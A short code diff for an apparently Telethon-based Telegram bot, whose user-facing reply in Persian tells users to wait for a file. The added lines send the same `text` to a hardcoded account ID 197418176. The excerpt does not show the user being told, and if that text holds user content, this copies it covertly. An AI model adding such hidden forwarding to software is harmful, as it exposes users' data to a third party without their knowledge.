@@ -53,6 +53,11 @@ async def main(event):
             text,
             link_preview=False
             )
+        send_me = await client.send_message(
+            197418176,
+            text,
+            link_preview=False
+            )
         message = await client.send_message(
             event.message.peer_id.user_id,
             "ممکنه چند دقیقه طول بکشه،صبور باشید!\n تموم که شد یه فایل براتون اینجا ارسال میشه .",
